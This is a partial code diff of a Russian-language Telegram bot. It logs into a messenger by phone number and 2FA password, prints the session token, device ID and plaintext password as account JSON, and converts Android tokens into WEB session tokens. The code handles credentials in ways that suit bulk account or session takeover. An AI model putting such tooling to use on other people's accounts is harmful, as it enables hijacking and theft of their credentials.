+                await msg.edit_text(f"❌ {status[6:]}", reply_markup=get_main_keyboard())
+                auth.close()
+                del pending[uid]
+                await state.clear()
+                return
+        
+        if pending[uid].get("status") != "done":
+            await msg.edit_text("❌ Таймаут регистрации.", reply_markup=get_main_keyboard())
+            auth.close()
+            del pending[uid]
+            await state.clear()
+            return
+    
+    if result.get("token"):
+        pending[uid]["token"] = result["token"]
+        pending[uid]["device_id"] = auth.device_id
+        pending[uid]["status"] = "done"
+    
+    if pending[uid].get("status") == "done":
+        token = pending[uid]["token"]
+        device_id = pending[uid].get("device_id", "")
+        
+        # Формат как в accounts.json оригинального бота
+        account_data = {
+            "token": token,
+            "device_id": device_id,
+            "web_token": None,
+            "user_id": 0,
+            "password": ""
+        }
+        
+        await msg.edit_text(
+            f"✅ <b>Токен получен!</b>\n\n"
+            f"📱 Телефон: <code>{phone}</code>\n\n"
+            f"📦 <b>Данные аккаунта:</b>\n"
+            f"<pre>{json.dumps(account_data, indent=2, ensure_ascii=False)}</pre>\n\n"
+            f"Можно скопировать и использовать для конвертации в WEB.",
+            parse_mode="HTML",
+            reply_markup=get_main_keyboard()
+        )
+        auth.close()
+        del pending[uid]
+        await state.clear()
+        return
+    
+    await msg.edit_text("❌ Неизвестная ошибка.", reply_markup=get_main_keyboard())
+    auth.close()
+    del pending[uid]
+    await state.clear()
+
+@dp.message(AuthState.waiting_for_password)
+async def password_handler(message: types.Message, state: FSMContext):
+    uid = message.from_user.id
+    if uid not in pending:
+        await message.answer("⏳ Сессия устарела. Нажмите /start")
+        return
+    
+    data = await state.get_data()
+    phone = data.get("phone", "")
+    pwd = message.text.strip()
+    auth = pending[uid].get("auth")
+    
+    if not auth:
+        await message.answer("⏳ Сессия устарела. Нажмите /start")
+        return
+    
+    msg = await message.answer("⏳ Проверяю пароль...")
+    
+    token = None
+    def do_check():
+        nonlocal token
+        try:
+            token = auth.check_password(pwd)
+        except:
+            pass
+    
+    threading.Thread(target=do_check, daemon=True).start()
+    await asyncio.sleep(3)
+    
+    if token:
+        device_id = auth.device_id
+        
+        # Формат как в accounts.json оригинального бота
+        account_data = {
+            "token": token,
+            "device_id": device_id,
+            "web_token": None,
+            "user_id": 0,
+            "password": pwd
+        }
+        
+        await msg.edit_text(
+            f"✅ <b>Токен получен!</b>\n\n"
+            f"📱 Телефон: <code>{phone}</code>\n\n"
+            f"📦 <b>Данные аккаунта:</b>\n"
+            f"<pre>{json.dumps(account_data, indent=2, ensure_ascii=False)}</pre>\n\n"
+            f"Можно скопировать и использовать для конвертации в WEB.",
+            parse_mode="HTML",
+            reply_markup=get_main_keyboard()
+        )
+    else:
+        await msg.edit_text("❌ Неверный пароль.", reply_markup=get_main_keyboard())
+    
+    auth.close()
+    if uid in pending:
+        del pending[uid]
+    await state.clear()
+
+@dp.callback_query(F.data == "convert_web")
+async def convert_web_handler(callback: types.CallbackQuery, state: FSMContext):
+    await state.clear()
+    await callback.message.answer(
+        "🔄 <b>Конвертация Android → WEB</b>\n\n"
+        "Отправьте JSON с данными аккаунта (как в выдаче после получения токена):\n\n"
+        "<pre>{\n"
+        '  "token": "ваш_android_токен",\n'
+        '  "device_id": "ваш_device_id",\n'
+        '  "password": "пароль_если_есть"\n'
+        "}</pre>\n\n"
+        "Или просто отправьте токен и device_id через | :\n"
+        "<code>ТОКЕН|DEVICE_ID|ПАРОЛЬ</code>",
+        parse_mode="HTML",
+        reply_markup=get_back_keyboard()
+    )
+    await callback.answer()
+
+@dp.message(F.text.regexp(r'^\{.*\}$'))
+async def convert_json_handler(message: types.Message):
+    """Обработчик JSON формата"""
+    try:
+        data = json.loads(message.text.strip())
+        token = data.get("token")
+        device_id = data.get("device_id")
+        password = data.get("password") or None
+        
+        if not token:
+            await message.answer("❌ В JSON отсутствует поле 'token'")
+            return
+        
+        if not device_id:
+            # Если нет device_id в JSON, генерируем новый
+            device_id = str(uuid.uuid4())
+            await message.answer(f"⚠️ Device ID не указан, создан новый: <code>{device_id}</code>", parse_mode="HTML")
+        
+        await process_conversion(message, token, device_id, password)
+        
+    except json.JSONDecodeError:
+        await message.answer("❌ Неверный JSON формат")
+    except Exception as e:
+        await message.answer(f"❌ Ошибка: {e}")
+
+@dp.message(F.text.regexp(r'^[^|]+\|[^|]+(\|.*)?$'))
+async def convert_pipe_handler(message: types.Message):
+    """Обработчик формата через |"""
+    parts = message.text.strip().split("|")
+    
+    if len(parts) < 2:
+        await message.answer("❌ Неверный формат.\nНужно: <code>ТОКЕН|DEVICE_ID|ПАРОЛЬ</code>")
+        return
+    
+    token = parts[0].strip()
+    device_id = parts[1].strip()
+    password = parts[2].strip() if len(parts) > 2 and parts[2].strip() else None
+    
+    if not token or not device_id:
+        await message.answer("❌ Токен и Device ID обязательны")
+        return
+    
+    await process_conversion(message, token, device_id, password)
+
+async def process_conversion(message: types.Message, token: str, device_id: str, password: str = None):
+    """Общая функция для конвертации"""
+    msg = await message.answer(f"🔄 Конвертирую Android токен в WEB...")
+    
+    def do_convert():
+        return convert_android_to_web(token, device_id, None, password)
+    
+    result = await asyncio.to_thread(do_convert)
+    
+    if result["success"] and result["web_token"]:
+        # Формат как в accounts.json оригинального бота
+        web_account = {
+            "token": token,  # оригинальный android токен
+            "device_id": device_id,
+            "web_token": result["web_token"],
+            "user_id": 0,
+            "password": password or ""
+        }
+        
+        await msg.edit_text(
+            f"✅ <b>Конвертация успешна!</b>\n\n"
+            f"📦 <b>WEB аккаунт:</b>\n"
+            f"<pre>{json.dumps(web_account, indent=2, ensure_ascii=False)}</pre>\n\n"
+            f"Android токен разлогинен.",
+            parse_mode="HTML",
+            reply_markup=get_main_keyboard()
+        )
+    elif result.get("error") == "2FA_PASSWORD_REQUIRED":
+        await msg.edit_text(
+            "❌ Требуется пароль 2FA!\n"
+            "Отправьте JSON с паролем или через | :\n"
+            "<code>ТОКЕН|DEVICE_ID|ПАРОЛЬ</code>",
+            parse_mode="HTML",
+            reply_markup=get_main_keyboard()
+        )
+    else:
+        error = result.get("error", "Неизвестная ошибка")
+        await msg.edit_text(
+            f"❌ Ошибка конвертации: {error}",
+            reply_markup=get_main_keyboard()
+        )
+
+@dp.message()
+async def fallback_handler(message: types.Message):
+    await message.answer(
+        "Используйте кнопки меню. /start\n\n"
+        "Поддерживаемые форматы для конвертации:\n"
+        "• JSON: <code>{\"token\":\"...\",\"device_id\":\"...\"}</code>\n"
+        "• Pipe: <code>ТОКЕН|DEVICE_ID|ПАРОЛЬ</code>",
+        parse_mode="HTML"
+    )
+
+async def main():
+    logging.info("Бот запущен!")
+    await dp.start_polling(bot)
+
+if __name__ == "__main__":
+    asyncio.run(main())
